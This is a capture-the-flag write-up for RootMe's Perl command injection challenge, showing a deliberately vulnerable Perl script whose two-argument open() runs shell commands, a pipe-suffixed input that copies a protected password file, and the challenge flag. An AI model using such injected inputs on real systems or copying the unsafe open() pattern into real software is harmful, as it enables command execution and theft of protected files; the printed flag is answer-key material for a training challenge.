---
title: RootMe Perl - Command Injection Writeup
date: 2023-10-05
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Perl - Command Injection

In this challenge we have following perl script

```perl
#!/usr/bin/perl
 
delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';
 
use strict;
use warnings;
 
main();
 
sub main {
    my ($file, $line) = @_;
 
    menu();
    prompt();
 
    while((my $file = <STDIN>)) {
        chomp $file;
 
        process_file($file);
 
        prompt();
    }
}
 
sub prompt {
    local $| = 1;
    print ">>> ";
}
sub menu {
    print "*************************\n";
    print "* Stat File Service    *\n";
    print "*************************\n";
}
 
sub check_read_access {
    my $f = shift;
 
    if(-f $f) {
        my $filemode = (stat($f))[2];
 
        return ($filemode & 4);
    }
 
    return 0;
}
 
sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);
 
    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
 
 
    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }
 
    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";
 
    close F;
}
```

We are interested in this lines

```perl
$file =~ /(.+)/;
$file = $1;
if(!open(F, $file)) {
    die "[-] Can't open $file: $!\n";
}
```

there is no any kind of validation of user input
and in perl function open works in a way that any filename with `|` postfix considered as a command to execute in shell
so we can pass in this program input like 

```shell
cat .passwd>/tmp/tempfile|
```

and then just read this file

```shell
cat /tmp/tempfile
```

and get flag `PerlCanDoBetterThanYouThink`